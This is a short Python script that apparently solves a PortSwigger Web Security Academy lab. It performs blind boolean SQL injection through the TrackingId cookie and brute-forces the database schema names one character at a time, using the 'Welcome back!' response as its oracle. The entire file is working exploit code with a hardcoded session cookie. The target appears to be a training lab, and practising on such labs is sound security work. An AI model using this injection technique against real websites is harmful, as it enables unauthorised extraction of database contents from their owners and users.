#!/usr/bin/python3

import requests
import signal
import sys
import string
import time
from pwn import *

def def_handler(sig, frame):
    print('\n\n[!] Saliendo...\n')
    sys.exit(1)

#ctrl_c 
signal.signal(signal.SIGINT, def_handler)


characters = string.printable


session = requests.session()

main_url = "https://0aef00700331290885008a5c000300b4.web-security-academy.net:443/"
headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}


def makeSQLI(): 
    p1 = log.progress("Fuerza buta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(1)

    p2 = log.progress("Datos Extraidos")

    extracted_info = ''

    # character position
    for position in range(1, 150):
        print(position)
        # range of characters
        for character in range(33,126):
            cookies = {"TrackingId": f"OZLu9L7hGiKlPnh' or (select (ASCII(substring(string_agg(schema_name, ', '), {position}, 1)) = {character}) from information_schema.schemata)-- -", "session": "CvkcVRZUf04sxCFBfNZ5CYfQFVY6EEPQ"}

            r = requests.get(main_url, headers=headers, cookies=cookies)

            if r.text.find("Welcome back!") != -1:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break


if __name__ == "__main__":
    makeSQLI()